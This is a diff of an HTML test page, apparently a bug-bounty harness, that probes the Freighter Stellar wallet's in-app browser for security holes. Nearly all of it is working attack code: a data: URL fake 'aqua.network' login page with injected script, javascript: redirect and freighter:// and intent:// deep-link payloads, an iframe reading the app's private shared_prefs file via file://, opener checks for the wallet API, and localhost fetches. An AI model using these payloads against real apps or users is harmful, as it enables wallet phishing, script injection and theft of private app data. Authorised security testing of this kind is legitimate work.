@@ -2,58 +2,82 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>ALL TESTS FIXED</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>BUG LAIN dApp Browser</title>
 <style>
-*{box-sizing:border-box}body{margin:0;background:#000;color:#0f0;font-family:monospace;padding:12px}
-.btn{display:block;width:100%;height:52px;background:#e4e4e7;color:#000;border:none;border-radius:999px;font-weight:800;margin:10px 0}
-.log{background:#000;border:1px solid #0f0;color:#0f0;padding:10px;white-space:pre-wrap;min-height:220px;font-size:12px;overflow:auto}
-#objWrap{height:1px;overflow:hidden;opacity:0.01}
-.card{background:#111;border:1px solid #333;border-radius:12px;padding:10px;margin:10px 0}
+body{background:#000;color:#0f0;font-family:monospace;padding:12px;margin:0}
+.btn{width:100%;height:50px;background:#fff;color:#000;border-radius:999px;font-weight:800;margin:8px 0;border:none}
+.log{border:1px solid #0f0;padding:10px;min-height:250px;white-space:pre-wrap;font-size:12px}
 </style>
 </head>
 <body>
-<div class="log" id="log">[Ready]</div>
-<div class="card">
-<button class="btn" onclick="testCurrent()">1. TEST CURRENT ORIGIN</button>
-<button class="btn" onclick="testBlob()">2. CREATE BLOB URL & TEST</button>
-<button class="btn" onclick="testObject()">3. TRIGGER UXSS OBJECT</button>
-<button class="btn" onclick="testBridge()">4. SCAN JS BRIDGES</button>
-<button class="btn" onclick="testPrivate()">5. TEST PRIVATE FILES</button>
-</div>
-<div id="objWrap"><object id="obj" data="about:blank" width="100%"></object></div>
+<pre id="log" class="log">[Ready] href=</pre>
+
+<button class="btn" onclick="test1()">1. about:blank + opener bypass</button>
+<button class="btn" onclick="test2()">2. data: base64 phishing</button>
+<button class="btn" onclick="test3()">3. universal fileURL access</button>
+<button class="btn" onclick="test4()">4. javascript redirect</button>
+<button class="btn" onclick="test5()">5. deep link freighter://</button>
+<button class="btn" onclick="test6()">6. DNS rebinding localhost</button>
+
 <script>
-const logEl=document.getElementById('log');
-logEl.textContent=`[Ready]\nhref=${location.href}\norigin=${location.origin}\nprotocol=${location.protocol}\n`;
-function L(m){logEl.textContent+=`\n${m}`;logEl.scrollTop=logEl.scrollHeight;}
-function testCurrent(){
- L('--- TEST 1 ---');L('freighterApi? '+!!window.freighterApi);
- if(window.freighterApi)L('>>> INJECTED di '+location.protocol+' - kamu di dalam Freighter');
- else L('NOT injected - kamu di luar Freighter (kayak screenshot 12.30 kemarin di Firefox)');
+const L = (m)=>{document.getElementById('log').textContent+='\n'+m; document.getElementById('log').innerText=document.getElementById('log').textContent.split('\n').slice(-40).join('\n'); console.log(m);}
+document.getElementById('log').textContent=`[Ready]\nhref=${location.href}\norigin=${location.origin}\nprotocol=${location.protocol}\nua=${navigator.userAgent.slice(0,70)}\n`;
+
+function test1(){
+ L('--- TEST 1 about:blank opener ---');
+ try{
+  let w = window.open('about:blank');
+  w.document.write(`<body style="background:#000;color:#0f0"><pre id=o></pre><script>
+  const o=document.getElementById('o'); o.textContent='about:blank origin:'+location.origin+'\\n opener:'+(!!window.opener)+'\\n freighter? '+(!!window.opener?.freighter)+'\\n freighterApi? '+(!!window.opener?.freighterApi);
+  if(window.opener?.freighter){ o.textContent+='\\n BUG HIGH: opener.freighter from about:blank'; }
+  <\/script></body>`);
+  L('Opened about:blank, check window');
+ }catch(e){L('Blocked '+e.message);}
 }
-function testBlob(){
- L('--- TEST 2 BLOB ---');
- const inner=`<body style="background:#000;color:#0f0"><pre id="o"></pre><script>
- const o=document.getElementById('o');o.textContent='origin:'+location.origin+'\\nfreighterApi?'+!!window.freighterApi;
- if(window.freighterApi)o.textContent+='\\nBUG HIGH di blob:null';else o.textContent+='\\nSECURE';
- <\/script></body>`;
- const url=URL.createObjectURL(new Blob([inner],{type:'text/html'}));
- window.open(url,'_blank');L('Opening blob:'+url);
+
+function test2(){
+ L('--- TEST 2 data: phishing ---');
+ const b64 = btoa('<h1 style="color:red">Fake aqua.network login</h1><script>alert(document.domain)<\/script>');
+ const dataUrl = 'data:text/html;base64,'+b64;
+ L('Opening '+dataUrl.slice(0,50));
+ window.open(dataUrl,'_blank');
+ L('Kalau URL bar keliatan aqua.network padahal data: = HIGH');
 }
-function testObject(){
- L('--- TEST 3 UXSS ---');
- const obj=document.getElementById('obj');obj.data='https://aqua.network';
- setTimeout(()=>{try{obj.data='javascript:alert("UXSS domain="+document.domain)';L('Set to javascript: - if alert aqua.network = CRITICAL');}catch(e){L('Blocked: '+e.message);}},500);
+
+function test3(){
+ L('--- TEST 3 universalFileURL ---');
+ let ifr = document.createElement('iframe');
+ ifr.src = 'file:///data/data/org.stellar.freighter/shared_prefs/org.stellar.freighter_preferences.xml';
+ document.body.appendChild(ifr);
+ ifr.onload = ()=>{ try{L('READABLE CRITICAL: '+ifr.contentDocument.body.innerHTML.slice(0,100));}catch(e){L('Blocked: '+e.message+' = SECURE');}};
+ ifr.onerror = ()=>{L('Blocked onerror = SECURE');};
+ setTimeout(()=>{try{console.log(ifr.contentDocument)}catch(e){L('Blocked after 1s: '+e.message);}},1000);
 }
-function testBridge(){
- L('--- TEST 4 BRIDGE ---');
- for(let k in window){if(k.toLowerCase().includes('android')||k.toLowerCase().includes('bridge')||k.toLowerCase().includes('testbridge'))L('Found window.'+k);}
+
+function test4(){
+ L('--- TEST 4 javascript: redirect ---');
+ // coba redirect chain
+ location.href = 'https://0x403for.github.io/1inch.html?redirect=javascript:alert(document.domain)';
+ L('Kalau alert domain aqua.network setelah redirect = Critical');
 }
-function testPrivate(){
- L('--- TEST 5 file:// ---');L('Save jadi /sdcard/Download/test.html lalu buka file:///sdcard/Download/test.html di Freighter');
- fetch('file:///data/data/org.stellar.freighter/files/').then(r=>r.text()).then(t=>L('READABLE CRITICAL len='+t.length)).catch(e=>L('Blocked SECURE'));
+
+function test5(){
+ L('--- TEST 5 deep link ---');
+ const links = [
+  'freighter://browse?url=javascript:alert(document.domain)',
+  [STRIPPED 85 bytes],
+  'intent://browse?url=https://0x403for.github.io/1inch.html#Intent;scheme=freighter;package=org.stellar.freighter;end'
+ ];
+ links.forEach(u=>{ L('Tap manual: '+u); });
+ L('Copy link di atas, kirim ke Telegram kamu, tap dari HP. Kalau alert = Critical');
 }
-testCurrent();
+
+function test6(){
+ L('--- TEST 6 DNS rebinding localhost ---');
+ fetch('http://127.0.0.1:5000').then(r=>r.text()).then(t=>L('READABLE localhost:5000 len='+t.length+' = HIGH')).catch(e=>L('Blocked localhost:5000 SECURE '+e.message.slice(0,50)));
+ fetch('http://localhost:8545').then(r=>r.text()).then(t=>L('READABLE localhost:8545 = HIGH')).catch(e=>L('Blocked localhost:8545 SECURE'));
+}
 </script>
 </body>
 </html>
